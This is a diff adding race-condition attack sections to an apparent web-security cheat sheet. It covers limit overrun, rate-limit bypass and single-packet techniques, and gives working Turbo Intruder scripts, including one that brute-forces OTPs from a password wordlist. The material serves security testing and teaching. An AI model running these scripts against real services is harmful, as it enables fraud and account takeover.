@@ -237,6 +237,104 @@ asyncio.run(h2_race())</code></pre>
 # 3. Look for success responses beyond what should be allowed
 # 4. Check for duplicate entries in your account/activity history</code></pre>
 
+  <h2>Race Condition Attack Patterns</h2>
+  <p>Attack pattern taxonomy and real-world examples from PayloadsAllTheThings.</p>
+
+  <h3>Limit-Overrun Pattern</h3>
+  <pre><code># Classic limit-overrun — exceed resource constraints via parallel requests:
+# Targets: balance checks, inventory, coupon redemption, vote/like limits
+
+# Real-world examples (from HackerOne):
+# - Race condition allows redeeming gift cards multiple times (h1 report 759247)
+# - Race conditions bypass invitation limits (h1 report 115007)
+# - Register multiple users from a single invitation (h1 report 148609)
+
+# Test pattern:
+# 1. Identify an operation with a numeric limit (apply coupon, use gift card)
+# 2. Queue 20-50 identical requests with Turbo Intruder
+# 3. Release all simultaneously via openGate
+# 4. Look for multiple 200 OK responses when only 1 should succeed</code></pre>
+
+  <h3>Rate-Limit Bypass Pattern</h3>
+  <pre><code># Rate limiting uses check-then-increment without atomicity:
+# "Has this user made &gt; N requests?"  ← check
+# counter += 1                         ← separate operation (not atomic)
+
+# Attack: send N+1 parallel requests before any increment is registered
+# All requests see count=0 at check time
+
+# Real-world: Instagram password reset — race to brute-force OTP
+# (Laxman Muthiyah, youtu.be/4O9FjTMlHUM)
+
+# Turbo Intruder for rate limit bypass:
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=30,
+                          requestsPerConnection=30,
+                          pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, i)
+    engine.openGate('race1')
+    engine.start(timeout=5)</code></pre>
+
+  <h2>Single-Packet Attack</h2>
+  <p>HTTP/2 single-packet attack technique from PayloadsAllTheThings — the most reliable race condition technique.</p>
+
+  <h3>HTTP/1.1 Last-Byte Synchronization</h3>
+  <pre><code># Send all but the last byte of each request, hold connections open
+# Then release the final byte of all connections simultaneously
+# Eliminates network jitter — all requests arrive in the same TCP window
+
+# Turbo Intruder last-byte sync:
+engine.queue(request, gate='race1')
+engine.queue(request, gate='race1')
+engine.openGate('race1')   # releases final byte for all queued requests</code></pre>
+
+  <h3>HTTP/2 Single-Packet Attack (Most Reliable)</h3>
+  <pre><code># HTTP/2 allows multiple requests over a single TCP connection
+# Single-packet: ~20-30 requests sent in ONE TCP packet
+# Network jitter = zero — perfect for tight race windows
+
+# Burp Suite native (2023+):
+# 1. Send request to Repeater
+# 2. Ctrl+R 19 more times (20 total)
+# 3. Create a new tab group → add all 20 requests
+# 4. Send group in parallel (single-packet attack)
+# 5. HTTP/2 must be enabled for the target
+
+# h2spacex — low-level HTTP/2 single-packet via Scapy:
+pip install h2spacex
+# github.com/nxenon/h2spacex
+
+# Raceocat — higher-level race condition tool:
+# github.com/JavanXD/Raceocat
+
+# CVE-2022-4037: Race condition in GitLab discovered using single-packet attack
+# (youtu.be/Y0NVIVucQNE)</code></pre>
+
+  <h3>Turbo Intruder Full Example</h3>
+  <pre><code">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    for i in range(20):
+        engine.queue(target.req, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+# For wordlist-based attacks (OTP brute force via race):
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=30,
+                          requestsPerConnection=30,
+                          pipeline=False)
+    for word in open('/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt'):
+        engine.queue(target.req, word.rstrip(), gate='otp')
+    engine.openGate('otp')</code></pre>
+
   <h2>Resources</h2>
   <ul>
     <li>PortSwigger research — Smashing the State Machine — <code>portswigger.net/research/smashing-the-state-machine</code></li>
